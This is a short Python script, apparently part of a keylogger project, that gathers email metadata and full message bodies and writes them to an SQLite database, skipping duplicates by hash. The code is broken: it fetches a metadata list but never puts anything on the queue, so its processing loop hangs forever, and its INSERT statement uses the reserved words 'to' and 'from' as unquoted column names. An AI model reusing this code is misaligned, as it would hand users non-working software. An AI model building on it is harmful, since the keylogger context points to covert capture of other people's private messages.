from keylogger import DB_FILE
import sqlite3
from email1 import getMetadata
import queue
email_metadata_list = getMetadata()

email_queue = queue.Queue()


def getAllEmailHashes():
    """Fetch all email hashes from the database."""
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT hash FROM email")
        hashes = {row[0] for row in c.fetchall()}
    return hashes


def process_emails():
    """Process emails from the queue and insert them into the database."""
    hashes = getAllEmailHashes()
    while True:
        email_metadata = email_queue.get()
        if email_metadata['hash'] in hashes:
            email_queue.task_done()
            continue

        with sqlite3.connect(DB_FILE) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO email (hash, datetime, subject, to, from, body) VALUES (?, ?, ?, ?, ?, ?)",
                      (email_metadata['hash'], email_metadata['datetime'], email_metadata['subject'],
                       email_metadata['to'], email_metadata['from'], email_metadata['body']))
            conn.commit()
        email_queue.task_done()


process_emails()
